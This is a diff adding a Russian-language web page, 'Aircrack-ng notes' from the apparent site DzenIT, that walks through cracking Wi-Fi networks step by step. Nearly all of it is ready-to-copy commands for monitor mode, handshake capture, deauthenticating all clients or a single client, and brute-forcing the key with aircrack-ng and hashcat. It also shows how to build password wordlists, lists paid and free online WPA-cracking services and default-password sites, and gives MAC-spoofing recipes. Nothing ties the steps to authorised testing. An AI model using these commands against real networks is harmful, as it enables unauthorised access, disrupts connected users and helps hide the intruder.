@@ -1,0 +1,206 @@
+
+<!DOCTYPE html>
+<html><head>
+<meta charset="UTF-8">
+<link rel="stylesheet" href="../css/text.css">
+<script src="../css/script.js"></script>
+<title>Aircrack-ng заметки</title>
+<link rel="icon" type="image/png" sizes="192x192" href="../img/favicon.png"> 
+<meta name="viewport" content="width=device-width">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="В этой статье описывается процесс мониторинга и взлома Wi-Fi сетей. Шаг за шагом объясняется, как настроить режим мониторинга, получить хэндшейк, проверить его на валидность и подобрать пароль. Также приведены примеры создания словарей для взлома паролей и рекомендации по использованию сервисов для взлома">
+<meta name="keywords" content="мониторинг, взлом, хэндшейк, пароль, словарь, сервисы, роутер, aircrack-ng, hashcat"> 
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Мониторинг и взлом Wi-Fi сетей">
+<meta name="twitter:description" content="">
+<meta name="twitter:image" content="img/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Мониторинг и взлом Wi-Fi сетей">
+<meta property="og:description" content="">
+<meta property="og:image" content="img/air.jpg">
+<meta property="og:site_name" content="DzenIT">
+  </head>
+  <body>
+  <div class="header">
+    <h2>DzenIT</h2>
+  </div>
+    <div class="topnav">
+    <a href="../index.html">HOME</a>
+    <a href="../zen.html">ZEN</a>
+    <a href="../it.html">IT</a>
+    <a href="../soft.html">SOFT</a>
+    <a href="../apk.html">APK</a>
+    <a href="../live.html">LIVE</a>
+    <a href="../game.html">GAME</a>
+    <a href="../other.html">OTHER</a>
+    <a href="../about.html">ABOUT</a>
+  </div>
+  <center><h1>Aircrack-ng заметки</h1></center>
+  
+  <p>Шаг 1: Подготовка</p>
+<p>Для начала, зайдите в систему под учетной записью root:</p>
+<pre class="code">sudo -i</pre>
+<button class="copy-button" onclick="copyCode(1)">Copy</button>
+
+<p>Затем, узнайте название своего сетевого интерфейса:</p>
+<pre class="code">ifconfig -a</pre>
+<button class="copy-button" onclick="copyCode(2)">Copy</button>
+
+<p>Чтобы избежать конфликтов с другими службами, отключите их:</p>
+<pre class="code">airmon-ng check kill</pre>
+<button class="copy-button" onclick="copyCode(3)">Copy</button>
+
+<p>Шаг 2: Включение режима мониторинга
+Включите режим мониторинга для своей сетевой карты wlan0:</p>
+<pre class="code">airmon-ng start wlan0</pre>
+<button class="copy-button" onclick="copyCode(4)">Copy</button>
+
+<p>Теперь у вас должен появиться новый интерфейс под названием wlan0mon. 
+Вы можете проверить это с помощью команды:</p>
+<pre class="code">ifconfig -a</pre>
+<button class="copy-button" onclick="copyCode(5)">Copy</button>
+
+<p>Шаг 3: Выключение режима мониторинга
+Когда вам больше не нужен режим мониторинга, выключите его:</p>
+<pre class="code">airmon-ng stop wlan0mon</pre>
+<button class="copy-button" onclick="copyCode(6)">Copy</button>
+
+<p>Шаг 4: Просмотр сетей
+Теперь вы можете просматривать доступные сети Wi-Fi с помощью команды:</p>
+<pre class="code">airodump-ng wlan0mon</pre>
+<button class="copy-button" onclick="copyCode(7)">Copy</button>
+
+<p>Шаг 5: Получение хэндшейка
+Выберите нужную сеть и запишите ее MAC-адрес и канал. Затем запустите следующую команду, чтобы получить хэндшейк:
+<pre>airodump-ng --bssid <b>MAC</b> -c <b>CHANAL</b> -w <b>NAME</b> <b>INTERFACE</b></pre></p>
+<p>Например:</p>
+<pre class="code">airodump-ng --bssid 00:00:00:00:00:00 -c 7 -w name wlan0mon</pre>
+<button class="copy-button" onclick="copyCode(8)">Copy</button>
+
+<p>Шаг 6: "Выбивание" сидов (опционально)
+Если у вас есть достаточное количество пакетов(lol), вы можете попытаться вынудить переподключение клиента или всех подключенных устройств к роутеру. Вот несколько примеров команд:</p>
+
+<p>Деаутентификация всех подключенных устройств к роутеру:</p>
+<pre class="code">aireplay-ng --deauth 20 -a 00:00:00:00:00:00 wlan0mon</pre>
+<button class="copy-button" onclick="copyCode(9)">Copy</button>
+
+<p>Деаутентификация одного клиента:</p>
+<pre class="code">aireplay-ng -0 1 -a 00:00:00:00:00:00 -c 11:11:11:11:11:11 wlan1mon</pre>
+<button class="copy-button" onclick="copyCode(10)">Copy</button>
+
+<p>Шаг 7: Проверка хэндшейка на валидность
+Используйте программу cowpatty для проверки хэндшейка на валидность. Запустите следующую команду:</p>
+<pre class="code">cowpatty -r name.cap -c</pre>
+<button class="copy-button" onclick="copyCode(11)">Copy</button>
+
+<p>Также можно проверить хэндшейк с помощью словаря. Вот несколько примеров команд:</p>
+
+<pre class="code">aircrack-ng -w datehp.txt -e NAME NAME-01.cap</pre>
+<button class="copy-button" onclick="copyCode(12)">Copy</button>
+<pre class="code">aircrack-ng -w datehp.txt -b 00:00:00:00:00:00 NAME-01.cap</pre>
+<button class="copy-button" onclick="copyCode(13)">Copy</button>
+
+<p>Шаг 8: Подбор пароля с помощью hashcat (для графических процессоров)
+Если вы хотите использовать графический процессор для подбора пароля, можно воспользоваться программой hashcat. Например, чтобы проверить пароль, состоящий из 8 цифр, запустите следующую команду:</p>
+<pre class="code">hashcat64.exe -m 2500 -a 3 1.hccapx ?d?d?d?d?d?d?d?d</pre>
+<button class="copy-button" onclick="copyCode(14)">Copy</button>
+
+<p>Шаг 9: Создание словарей
+Если вам нужны словари для подбора паролей, вот несколько примеров их создания.
+
+Создание словаря с днями рождениями:</p>
+<pre class="code">echo -e roma{01..31}{01..12}{1970..2000}"\n" > roma.txt</pre>
+<button class="copy-button" onclick="copyCode(15)">Copy</button>
+
+<p>Создание словаря только с маленькими буквами:</p>
+<pre class="code">echo -e {a..z}{a..z}{a..z}{a..z}{a..z}{a..z}{a..z}{a..z}"\n" > only_abc.txt</pre>
+<button class="copy-button" onclick="copyCode(15)">Copy</button>
+
+<p>Адаптация словаря "rocky" для взлома Wi-Fi:</p>
+<pre>cp /usr/share/wordlists/rockyou.txt.gz
+gunzip rockyou.txt.gz
+cat rockyou.txt | sort | uniq | pw-inspector -m 8 -M 63 > newrockyou.txt
+wc -l newrockyou.txt
+wc -l rockyou.txt
+</pre>
+	  
+<p>Шаг 10: Словари и сервисы</p>
+	  <details><summary><b>Посмотреть код</b></summary><pre>
+	  <a href="URL" target="_blank" rel="noopener noreferrer">github.com/vladimircicovic/wifi_pass</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/D4Vinci/CWFF</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/Bo0oM/fuzz.txt</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/Josue87/gotator</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/sc0tfree/mentalist</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/LandGrey/pydictor</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/skahwah/wordsmith</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/six2dez/OneListForAll</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/ignis-sec/Pwdb-Public</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/1N3/IntruderPayloads</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/fuzzdb-project/fuzzdb</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/danielmiessler/SecLists</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/FlameOfIgnis/Pwdb-Public</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/berzerk0/Probable-Wordlists</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/laconicwolf/Password-Scripts</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/initstring/passphrase-wordlist</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/random-robbie/bruteforce-lists</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/govolution/betterdefaultpasslist</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/insidetrust/statistically-likely-usernames</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">utkusen.com/blog/generating-personalized-wordlists</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">github.com/sorokinpf/cth_wordlists/tree/master/keyboard</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">defpass.com</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">many-passwords.github.io</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">fortypoundhead.com</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">cirt.net</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">datarecovery.com</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">passwordsdatabase.com</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">default-password.info</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">www.routerpasswords.com</a>
+	  
+	  </pre></details>
+  <p>Вместо брута, сервисы для простых паролей и не только:</p>
+<p>бесплатные:</p>
+<details><summary><b>Посмотреть код</b></summary><pre>https://www.onlinehashcrack.com/
+http://wpa-sec.stanev.org/</pre></details>
+<p>платные:</p>
+<pre>http://psk.do.am
+http://www.gpuhash.me/
+https://www.cloudcracker.com
+http://tools.question-defense.com/wpa-password-cracker/
+http://airslax.com
+http://xsrc.ru
+http://www.hashkiller.co.uk/wpa-crack.aspx
+https://decrypthash.ru/</pre>
+	  
+	  <p>Дыры в роутерах:</p>
+<a href="URL" target="_blank" rel="noopener noreferrer">https://modemly.com/m1/pulse</a>
+	 <p> Прикольная инфа по антенам:</p>
+<a href="URL" target="_blank" rel="noopener noreferrer">http://www.lan23.ru/forum/showthread.php?t=10159&page=1</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">https://3g-aerial.biz/wi-fi-3g-4g-pushka-analiz-i-raschet</a>
+<a href="URL" target="_blank" rel="noopener noreferrer">http://richadm.ru/wifi-antenny/samodelnaya-wifi-antenna-yagi/</a>
+	  
+	  <p>Смена mac:</p>
+<p>1й:</p>
+<pre>apt-get install macchanger
+ifconfig wlan0 down
+macchanger -r wlan0
+ifconfig wlan0 up</pre>
+
+<p>2й:</p>
+<pre>ifconfig wlan0 down
+ifconfig wlan0 hw ether 00:56:CD:7A:70:0C
+ifconfig wlan0 up</pre>
+<p>Чтобы конфигурация сохранилась после перезагрузки, прописываем нужную строчку в                                                                                /etc/network/interfaces :
+</p><pre>hwaddress ether 01:a2:33:04:d0:f1</pre>
+<p>Выполняем рестарт сети:</p>
+<pre>/etc/init.d/networking restart</pre>
+
+<p>3й автоматически рандомный при подключении wifi:</p>
+<pre>nano /etc/NetworkManager/NetworkManager.conf</pre>
+<p>добавить</p>
+<pre>[connection]
+wifi.cloned-mac-address=random</pre>
+<p>перезагрузить сеть</p>
+<pre>sudo systemctl restart NetworkManager</pre>
+   </body>
+
+</html>
